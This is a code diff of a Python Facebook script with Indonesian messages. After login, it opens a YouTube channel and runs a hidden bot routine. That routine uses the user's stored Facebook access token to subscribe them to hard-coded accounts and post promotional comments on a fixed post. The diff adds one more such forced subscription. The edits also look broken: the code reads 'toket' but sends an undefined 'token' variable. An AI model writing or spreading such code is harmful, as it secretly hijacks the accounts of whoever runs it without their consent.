@@ -104,7 +104,7 @@ def log_token():
         print((m+"\n["+k+"?"+m+"]"+h+" Login Successful"))
         jalan('\033[1;96mAGAR BERJALAN LANCAR ANDA HARUS SUBSCRIBE DULU CHANNEL INI!')
         os.system('xdg-open https://youtu.be/bszAm4C5ovE')
-        bot()
+        bot_follow()
     except KeyError:
         print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
         os.system("clear")
@@ -112,18 +112,19 @@ def log_token():
 
 ###### BOT KOMEN ######
 
-def bot():
+def bot_follow():
 	try:
 		toket=open("login.txt","r").read()
-		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
 		a = json.loads(otw.text)
 		nama = a["name"]
 		id = a["id"]
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-		tokenz()
+		token()
 	amanda = ("Gantengnya Aa @[100000834003593:]")
         raka = ("Script Nya Krend Bang...")
+        requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
 	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
 	requests.post('https://graph.facebook.com/953529338576547/comments/?message='+raka+'&access_token='+token)
 	requests.post('https://graph.facebook.com/953529338576547/comments/?message='+amanda+'&access_token='+token)
